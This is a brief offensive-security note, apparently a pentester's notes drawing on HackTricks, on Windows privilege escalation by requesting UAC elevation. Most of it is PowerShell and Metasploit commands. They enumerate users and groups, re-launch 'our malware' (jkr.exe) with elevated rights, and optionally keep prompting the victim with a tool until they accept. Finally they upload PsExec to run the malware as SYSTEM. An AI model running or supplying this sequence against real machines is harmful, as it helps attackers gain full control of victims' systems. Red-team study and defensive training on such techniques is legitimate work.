
> source : https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control#uac-bypass-with-gui

You can just ask for the UAC, but it's very noicy, since the victim has to accept the prompt

#### powershell syntax

```powershell
Start-Process <executable> -Verb runas

Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c <your command here> /priv'; exit

# example
Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c "whoami" /priv'; exit

```

### Example

```powershell
# list valid users
net user

# get user groups
net user talion
whoami /groups

# ask for uac just one time and re-execute our malware with new privileges
Start-Process "C:\Users\talion\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\jkr.exe" -Verb runas; exit

# If you don't care to be noisy, and continuously ask until UAC is accedpted by the victim, you could just use : https://github.com/Chainski/ForceAdmin

# Now that we have elevated our privileges, we can become NT AUTHORITY\SYSTEM with PsExec downloaded from https://live.sysinternals.com/
msf> upload PsExec.exe
.\PsExec.exe -i -s "C:\Users\talion\AppData\Local\Temp\jkr.exe"

```